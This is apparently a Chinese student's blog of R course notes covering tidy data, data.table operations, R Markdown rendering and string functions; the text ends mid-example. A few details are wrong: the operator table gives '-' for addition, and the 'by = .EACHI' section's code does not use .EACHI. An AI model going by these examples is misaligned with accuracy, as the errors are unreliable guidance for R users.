title="数据结构"></a>数据结构</h1><hr><h1 id="data-table"><a href="#data-table" class="headerlink" title="data.table"></a>data.table</h1><h1 id="ggplot2"><a href="#ggplot2" class="headerlink" title="ggplot2"></a>ggplot2</h1><hr><p>R图表中显示数据类型<br><code>&lt;dbl&gt;</code>  double类型<br><code>&lt;chr&gt;</code>  字符串类型</p><hr><p>4.18</p><h1 id="tidy"><a href="#tidy" class="headerlink" title="tidy"></a>tidy</h1><blockquote><p>“整洁的数据集都是相似的；混乱的数据集各有各的混乱。”</p></blockquote><h2 id="tidy-data"><a href="#tidy-data" class="headerlink" title="tidy data"></a>tidy data</h2><p>整洁的数据集需要简单地满足以下两个要素：<br>(1) 每列是一个变量（Variables go in columns)<br>(2) 每行是一个观测（Observation go in rows）</p><p>怎么理解这两个要素呢？<br>数据集中，每一列应该表示一个变量（属性或特征）。变量是描述数据的某一方面的内容，例如年龄、性别、收入等。<br>数据集中，每一行应该表示一个观测值（记录或实例）。观测是数据的一个完整单元，例如某个人、某个时间点的测量值等。</p><h2 id="dcast"><a href="#dcast" class="headerlink" title="dcast()"></a>dcast()</h2><p>用法</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs r">dcast<span class="hljs-punctuation">(</span><br><br>data<span class="hljs-punctuation">,</span> <span class="hljs-comment"># 数据框对象</span><br><br>formula<span class="hljs-punctuation">,</span> <span class="hljs-comment"># LHS ~ RHS 控制宽格式的列  描述如何将数据分组和重塑的公式</span><br><br>fun.aggregate<span class="hljs-punctuation">,</span> <span class="hljs-comment"># 变换宽格式的函数</span><br><br>value.var， <span class="hljs-comment"># 需要填充值到变换后区域的列</span><br><br>sep<span class="hljs-punctuation">,</span> <span class="hljs-comment"># 生成新列名时用于连接的分隔符</span><br><br>fill<span class="hljs-punctuation">,</span> <span class="hljs-comment"># 在宽格式中填充的默认值</span><br><br>drop <span class="hljs-comment"># 是否保留缺失的组合</span><br><br><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><h1 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h1><p>rmd 转 pdf html word</p><ol><li><p>代码</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r">rmarkdown<span class="hljs-operator">::</span>render<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;your_file.rmd&quot;</span><span class="hljs-punctuation">,</span> output_format <span class="hljs-operator">=</span> <span class="hljs-string">&quot;pdf_document&quot;</span><span class="hljs-punctuation">)</span><br>rmarkdown<span class="hljs-operator">::</span>render<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;your_file.rmd&quot;</span><span class="hljs-punctuation">,</span> output_format <span class="hljs-operator">=</span> <span class="hljs-string">&quot;html_document&quot;</span><span class="hljs-punctuation">)</span><br>rmarkdown<span class="hljs-operator">::</span>render<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;your_file.rmd&quot;</span><span class="hljs-punctuation">,</span> output_format <span class="hljs-operator">=</span> <span class="hljs-string">&quot;word_document&quot;</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure></li><li><p>在YAML头部指定输出格式</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><br><br><br></code></pre></td></tr></table></figure></li></ol><hr><h1 id="R-Markdown文件结构"><a href="#R-Markdown文件结构" class="headerlink" title="R Markdown文件结构"></a>R Markdown文件结构</h1><h2 id="YAML头部"><a href="#YAML头部" class="headerlink" title="YAML头部"></a>YAML头部</h2><p>在rmd文件中，YAML头部位于文件的开头部分，用于指定文档的元信息和输出格式。以三条短横线(<code>---</code>)开始和结束：</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><br>title<span class="hljs-operator">:</span> <span class="hljs-string">&quot;Document Title&quot;</span><br>author<span class="hljs-operator">:</span> <span class="hljs-string">&quot;yvyvSunlight&quot;</span><br>date<span class="hljs-operator">:</span> <span class="hljs-string">&quot;`r Sys.Date()`&quot;</span><br>output<span class="hljs-operator">:</span><br>html_document<span class="hljs-operator">:</span> default<br>pdf_document<span class="hljs-operator">:</span> default<br><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><br></code></pre></td></tr></table></figure><h2 id="常用预处理代码"><a href="#常用预处理代码" class="headerlink" title="常用预处理代码"></a>常用预处理代码</h2><figure class="highlight plaintext"><figcaption><span>setup, include</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs &#123;r">knitr::opts_chunk$set(echo=T,message=F,warning=F,error=T)<br>library(data.table)<br>library(ggplot2)<br></code></pre></td></tr></table></figure><hr><h1 id="空格与缩进"><a href="#空格与缩进" class="headerlink" title="空格与缩进"></a>空格与缩进</h1><p>在代码编辑过程中，有人推荐使用空格而非缩进，<br>原因是有的语言语法规范是缩进2字节、而有的语言语法规范是缩进4字节<br>而代码编辑器的缩进值一般是一个固定值（常常是4字节）</p><p>所以有人推荐用空格自由控制缩进字节数</p><p>我们经常遇到：<br>代码编辑器 缩进4字节 — 语法规范 缩进4字节<br>十分顺手</p><p>而R语言 它的语法规范就是缩进2字节的<br>（虽然缩进4字节也能正常运行）</p><hr><p>merge函数</p><h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">paste<span class="hljs-punctuation">(</span>...<span class="hljs-punctuation">,</span> sep <span class="hljs-operator">=</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> collapse <span class="hljs-operator">=</span> <span class="hljs-string">&quot;, &quot;</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">paste0<span class="hljs-punctuation">(</span>...<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>简化版paste</p><h2 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs R">tstrsplit<span class="hljs-punctuation">(</span>x<span class="hljs-punctuation">,</span> split<span class="hljs-punctuation">,</span> type.convert <span class="hljs-operator">=</span> <span class="hljs-literal">FALSE</span><span class="hljs-punctuation">,</span> fixed <span class="hljs-operator">=</span> <span class="hljs-literal">FALSE</span><span class="hljs-punctuation">,</span> perl <span class="hljs-operator">=</span> <span class="hljs-literal">FALSE</span><span class="hljs-punctuation">,</span> ...<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>x: 要拆分的字符串向量或数据表中的列<br>split： 分隔符，可以是字符串或正则表达式<br>type.convert： 逻辑值，是否自动将结果转为适当的数据类型（如数值型）。默认为<code>FALSE</code>。<br><code>fixed</code>：逻辑值，是否自动将</p><hr><p>R语言老师云：<br>机器学习、深度学习不难，往往是现成的。<br>难得是数据的修正、检查、提高质量！！</p><p>Garbage in,garbage out!</p><p>poisine garbage</p><p>一定要做的是数据清洗！</p><hr><p>10 11 12不考</p><hr><h1 id="课程复习"><a href="#课程复习" class="headerlink" title="课程复习"></a>课程复习</h1><h2 id="1-2-R-intro"><a href="#1-2-R-intro" class="headerlink" title="1&amp;2. R intro"></a>1&amp;2. R intro</h2><p>运算符</p><table><thead><tr><th>运算符</th><th>含义</th><th>例子</th></tr></thead><tbody><tr><td>-</td><td>加</td><td>1 + 2</td></tr><tr><td>-</td><td>减</td><td>3 - 2</td></tr><tr><td>*</td><td>乘</td><td>3 * 2</td></tr><tr><td>&#x2F;</td><td>除</td><td>9 &#x2F; 3</td></tr><tr><td>^</td><td>乘方</td><td>2 ^ 3</td></tr><tr><td>**</td><td>乘方</td><td>2 ** 3</td></tr><tr><td>%%</td><td>取余</td><td>9 %% 4</td></tr><tr><td>%&#x2F;%</td><td>取整</td><td>9 %&#x2F;% 4</td></tr></tbody></table><h2 id="3-Data-Visualisation"><a href="#3-Data-Visualisation" class="headerlink" title="3. Data Visualisation"></a>3. Data Visualisation</h2><h2 id="4-Data-transformation"><a href="#4-Data-transformation" class="headerlink" title="4. Data transformation"></a>4. Data transformation</h2><h2 id="5-data-table、io、Factor"><a href="#5-data-table、io、Factor" class="headerlink" title="5. data.table、io、Factor"></a>5. data.table、io、Factor</h2><h2 id="6-data-Reshaping"><a href="#6-data-Reshaping" class="headerlink" title="6. data Reshaping"></a>6. data Reshaping</h2><h2 id="7-rational-data"><a href="#7-rational-data" class="headerlink" title="7. rational data"></a>7. rational data</h2><h2 id="8-dates-and-time"><a href="#8-dates-and-time" class="headerlink" title="8. dates and time"></a>8. dates and time</h2><h2 id="9-strings"><a href="#9-strings" class="headerlink" title="9.strings"></a>9.strings</h2><h2 id="10-funciotns-iteration"><a href="#10-funciotns-iteration" class="headerlink" title="10. funciotns iteration"></a>10. funciotns iteration</h2><h2 id="11-functional-programming"><a href="#11-functional-programming" class="headerlink" title="11. functional programming"></a>11. functional programming</h2><h2 id="12-Probability-and-Hypothesis-Testing"><a href="#12-Probability-and-Hypothesis-Testing" class="headerlink" title="12. Probability and Hypothesis Testing"></a>12. Probability and Hypothesis Testing</h2><p>假设和检验</p><p><code>data.table</code> 是 R 语言中一个功能强大的包，用于高效地处理和分析数据。它提供了许多快速且简洁的数据操作方法。以下是 <code>data.table</code> 的一些常见操作示例：</p><hr><h2 id="1-创建-data-table"><a href="#1-创建-data-table" class="headerlink" title="1. 创建 data.table"></a><strong>1. 创建 <code>data.table</code></strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 创建一个 data.table</span><br>library<span class="hljs-punctuation">(</span>data.table<span class="hljs-punctuation">)</span><br>dt <span class="hljs-operator">&lt;-</span> data.table<span class="hljs-punctuation">(</span><br>  id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>  name <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;Alice&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Bob&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Charlie&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;David&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Eve&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span><br>  age <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-number">25</span><span class="hljs-punctuation">,</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span> <span class="hljs-number">35</span><span class="hljs-punctuation">,</span> <span class="hljs-number">40</span><span class="hljs-punctuation">,</span> <span class="hljs-number">45</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span><br>  salary <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-number">50000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">54000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">60000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">62000</span><span class="hljs-punctuation">,</span> <span class="hljs-number">65000</span><span class="hljs-punctuation">)</span><br><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-子集操作：筛选行"><a href="#2-子集操作：筛选行" class="headerlink" title="2. 子集操作：筛选行"></a><strong>2. 子集操作：筛选行</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 筛选年龄大于 30 的行</span><br>dt<span class="hljs-punctuation">[</span>age <span class="hljs-operator">&gt;</span> <span class="hljs-number">30</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="3-子集操作：选择列"><a href="#3-子集操作：选择列" class="headerlink" title="3. 子集操作：选择列"></a><strong>3. 子集操作：选择列</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 选择特定列</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> .<span class="hljs-punctuation">(</span>name<span class="hljs-punctuation">,</span> salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="4-排序"><a href="#4-排序" class="headerlink" title="4. 排序"></a><strong>4. 排序</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 按年龄升序排序</span><br>dt<span class="hljs-punctuation">[</span>order<span class="hljs-punctuation">(</span>age<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 按工资降序排序</span><br>dt<span class="hljs-punctuation">[</span>order<span class="hljs-punctuation">(</span><span class="hljs-operator">-</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-分组和聚合"><a href="#5-分组和聚合" class="headerlink" title="5. 分组和聚合"></a><strong>5. 分组和聚合</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 按年龄分组，计算每组的平均工资</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> .<span class="hljs-punctuation">(</span>avg_salary <span class="hljs-operator">=</span> mean<span class="hljs-punctuation">(</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> age<span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 按多个列分组</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> .<span class="hljs-punctuation">(</span>avg_salary <span class="hljs-operator">=</span> mean<span class="hljs-punctuation">(</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> .<span class="hljs-punctuation">(</span>age<span class="hljs-punctuation">,</span> name<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="6-更新和修改"><a href="#6-更新和修改" class="headerlink" title="6. 更新和修改"></a><strong>6. 更新和修改</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 更新工资（增加 10%）</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> salary <span class="hljs-operator">:=</span> salary <span class="hljs-operator">*</span> <span class="hljs-number">1.1</span><span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 添加新列</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> bonus <span class="hljs-operator">:=</span> salary <span class="hljs-operator">*</span> <span class="hljs-number">0.1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-删除行或列"><a href="#7-删除行或列" class="headerlink" title="7. 删除行或列"></a><strong>7. 删除行或列</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 删除年龄大于 40 的行</span><br>dt <span class="hljs-operator">&lt;-</span> dt<span class="hljs-punctuation">[</span>age <span class="hljs-operator">&lt;=</span> <span class="hljs-number">40</span><span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 删除列</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> age <span class="hljs-operator">:=</span> <span class="hljs-literal">NULL</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-连接操作"><a href="#8-连接操作" class="headerlink" title="8. 连接操作"></a><strong>8. 连接操作</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 创建另一个 data.table</span><br>dt2 <span class="hljs-operator">&lt;-</span> data.table<span class="hljs-punctuation">(</span><br>  id <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">,</span><br>  department <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;HR&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;IT&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Finance&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Marketing&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Admin&quot;</span><span class="hljs-punctuation">)</span><br><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 内连接</span><br>merged <span class="hljs-operator">&lt;-</span> merge<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> dt2<span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-built_in">all</span> <span class="hljs-operator">=</span> <span class="hljs-literal">FALSE</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 左连接</span><br>merged <span class="hljs-operator">&lt;-</span> merge<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> dt2<span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span><span class="hljs-punctuation">,</span> all.x <span class="hljs-operator">=</span> <span class="hljs-literal">TRUE</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><h2 id="9-使用-进行高效更新"><a href="#9-使用-进行高效更新" class="headerlink" title="9. 使用 := 进行高效更新"></a><strong>9. 使用 <code>:=</code> 进行高效更新</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 更新特定行的值</span><br>dt<span class="hljs-punctuation">[</span>id <span class="hljs-operator">==</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span> salary <span class="hljs-operator">:=</span> <span class="hljs-number">65000</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="10-多键操作"><a href="#10-多键操作" class="headerlink" title="10. 多键操作"></a><strong>10. 多键操作</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 设置多键</span><br>setkey<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> id<span class="hljs-punctuation">,</span> name<span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 使用多键进行查询</span><br>dt<span class="hljs-punctuation">[</span>.<span class="hljs-punctuation">(</span><span class="hljs-number">3</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Charlie&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="11-使用-SD-和-BY"><a href="#11-使用-SD-和-BY" class="headerlink" title="11. 使用 .SD 和 .BY"></a><strong>11. 使用 <code>.SD</code> 和 <code>.BY</code></strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 使用 .SD 计算分组内的标准差</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> .<span class="hljs-punctuation">(</span>sd_salary <span class="hljs-operator">=</span> sd<span class="hljs-punctuation">(</span>.SD<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> age<span class="hljs-punctuation">,</span> .SDcols <span class="hljs-operator">=</span> <span class="hljs-string">&quot;salary&quot;</span><span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 使用 .BY 获取分组信息</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> .<span class="hljs-punctuation">(</span>count <span class="hljs-operator">=</span> .N<span class="hljs-punctuation">,</span> group <span class="hljs-operator">=</span> .BY<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> age<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="12-条件操作"><a href="#12-条件操作" class="headerlink" title="12. 条件操作"></a><strong>12. 条件操作</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 条件赋值</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> bonus <span class="hljs-operator">:=</span> fifelse<span class="hljs-punctuation">(</span>salary <span class="hljs-operator">&gt;</span> <span class="hljs-number">60000</span><span class="hljs-punctuation">,</span> salary <span class="hljs-operator">*</span> <span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> salary <span class="hljs-operator">*</span> <span class="hljs-number">0.1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="13-熔合和透视表"><a href="#13-熔合和透视表" class="headerlink" title="13. 熔合和透视表"></a><strong>13. 熔合和透视表</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 熔合数据（类似 tidyr::gather）</span><br>melt<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> id.vars <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span><span class="hljs-punctuation">,</span> measure.vars <span class="hljs-operator">=</span> <span class="hljs-built_in">c</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;age&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;salary&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-comment"># 透视表（类似 tidyr::spread）</span><br>dcast<span class="hljs-punctuation">(</span>dt<span class="hljs-punctuation">,</span> id <span class="hljs-operator">~</span> name<span class="hljs-punctuation">,</span> value.var <span class="hljs-operator">=</span> <span class="hljs-string">&quot;salary&quot;</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><hr><h2 id="14-使用-on-进行连接"><a href="#14-使用-on-进行连接" class="headerlink" title="14. 使用 on 进行连接"></a><strong>14. 使用 <code>on</code> 进行连接</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 按键连接</span><br>dt<span class="hljs-punctuation">[</span>dt2<span class="hljs-punctuation">,</span> on <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span><span class="hljs-punctuation">,</span> nomatch <span class="hljs-operator">=</span> <span class="hljs-number">0L</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="15-使用-by-EACHI-进行分组操作"><a href="#15-使用-by-EACHI-进行分组操作" class="headerlink" title="15. 使用 by = .EACHI 进行分组操作"></a><strong>15. 使用 <code>by = .EACHI</code> 进行分组操作</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 按组计算排名</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> rank <span class="hljs-operator">:=</span> frank<span class="hljs-punctuation">(</span><span class="hljs-operator">-</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> age<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="16-使用-Reduce-和-Map-进行复杂操作"><a href="#16-使用-Reduce-和-Map-进行复杂操作" class="headerlink" title="16. 使用 Reduce 和 Map 进行复杂操作"></a><strong>16. 使用 <code>Reduce</code> 和 <code>Map</code> 进行复杂操作</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 使用 Reduce 计算累积和</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> cum_salary <span class="hljs-operator">:=</span> Reduce<span class="hljs-punctuation">(</span>`+`<span class="hljs-punctuation">,</span> .SD<span class="hljs-punctuation">,</span> accumulate <span class="hljs-operator">=</span> <span class="hljs-literal">TRUE</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> .SDcols <span class="hljs-operator">=</span> <span class="hljs-string">&quot;salary&quot;</span><span class="hljs-punctuation">]</span><br><br><span class="hljs-comment"># 使用 Map 计算工资的平方</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> salary_squared <span class="hljs-operator">:=</span> Map<span class="hljs-punctuation">(</span>`^`<span class="hljs-punctuation">,</span> .SD<span class="hljs-punctuation">,</span> <span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> .SDcols <span class="hljs-operator">=</span> <span class="hljs-string">&quot;salary&quot;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="17-使用-shift-进行滞后和领先计算"><a href="#17-使用-shift-进行滞后和领先计算" class="headerlink" title="17. 使用 shift 进行滞后和领先计算"></a><strong>17. 使用 <code>shift</code> 进行滞后和领先计算</strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 计算工资的月度增长率</span><br>dt<span class="hljs-punctuation">[</span><span class="hljs-punctuation">,</span> salary_growth <span class="hljs-operator">:=</span> <span class="hljs-punctuation">(</span>salary <span class="hljs-operator">-</span> shift<span class="hljs-punctuation">(</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">/</span> shift<span class="hljs-punctuation">(</span>salary<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> by <span class="hljs-operator">=</span> id<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><hr><h2 id="18-使用-unique-和-duplicated"><a href="#18-使用-unique-和-duplicated" class="headerlink" title="18. 使用 unique 和 duplicated"></a><strong>18. 使用 <code>unique</code> 和 <code>duplicated</code></strong></h2><p>r</p><p>复制</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 获取唯一行</span><br>unique<span 